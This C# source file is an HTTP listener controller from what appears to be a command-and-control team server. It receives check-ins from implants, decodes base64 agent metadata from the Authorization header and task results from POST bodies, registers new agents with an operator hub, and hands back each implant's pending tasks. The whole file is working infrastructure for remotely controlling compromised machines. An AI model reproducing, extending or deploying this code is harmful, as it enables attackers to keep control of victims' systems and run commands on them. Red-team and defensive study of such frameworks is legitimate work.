using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Newtonsoft.Json;
using System.Text;
using TeamServer.Data;
using TeamServer.Models.Agents;
using System.Web;
using TeamServer.Hubs;

namespace TeamServer.Models.Listeners.Types
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {

        private readonly DataContext _context;

        private readonly AmberHub _amberHub;
        public HttpListenerController(DataContext context, AmberHub amberHub)
        {
            _context = context;
            _amberHub = amberHub;
        }

        public async Task<IActionResult> HandleImplant()
        {
            
            var headers = HttpContext.Request.Headers;
            var request = HttpContext.Request;
            var responseBody = await CheckPostRequest(request);
            if (responseBody != "")
            {
                AgentTaskResult agentTaskResult = ExtractTaskResult(responseBody);
                var agentTaskByAgentTaskResultId =
                    await _context.AgentTasks.FirstOrDefaultAsync(item => item.Id == agentTaskResult.TaskId);
                if(agentTaskByAgentTaskResultId != null)
                {
                    agentTaskByAgentTaskResultId.Status = true;
                    await _context.AgentTasksResult.AddAsync(agentTaskResult);
                    _context.SaveChanges();
                }
            }
            var agent = ExtractMetadata(headers);
            if (agent is null)
                return BadRequest();

            var agentById = await _context.Agents.FindAsync(agent.Id);
            if( agentById is null)
            {
                _context.Agents.Add(agent);
                await _context.SaveChangesAsync();
                _amberHub.SendNewAgent(agent.Id);
            }

            var task = await _context.AgentTasks.Where(agentTask => agentTask.AgentId == agent.Id && agentTask.Status == false).ToArrayAsync();
            return Ok(task);
        }

        private Agent ExtractMetadata(IHeaderDictionary headers)
        {
            if (!headers.TryGetValue("Authorization", out var encodedMetadata))
                return null;

            encodedMetadata = encodedMetadata.ToString().Remove(0, 7);
            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetadata));

            Agent agent = JsonConvert.DeserializeObject<Agent>(json);
            return agent;
        } 
        private AgentTaskResult ExtractTaskResult(string data)
        {

            var base64data = data.Remove(0, 5).ToString();

            var json = Encoding.UTF8.GetString(Convert.FromBase64String(HttpUtility.UrlDecode(base64data)));

            AgentTaskResult agentTaskResult = JsonConvert.DeserializeObject<AgentTaskResult>(json);
            return agentTaskResult;
        }

        private async Task<string> EncodeCommand(AgentTask agentTask)
        {
            if (agentTask is null)
                return null;

            var jsonData = JsonConvert.SerializeObject(agentTask);
            byte[] jsonBytes = Encoding.UTF8.GetBytes(jsonData);
            string base64Data = Convert.ToBase64String(jsonBytes);

            return base64Data;
        }

        private async Task<string> CheckPostRequest(HttpRequest request)
        {
            if (request.Method.Equals("POST", StringComparison.OrdinalIgnoreCase))
            {
                string requsetBody;
                using (StreamReader reader = new StreamReader(request.Body, Encoding.UTF8))
                {
                    requsetBody = await reader.ReadToEndAsync();
                }
                return requsetBody;
            }
            return "";
        }
    }
}
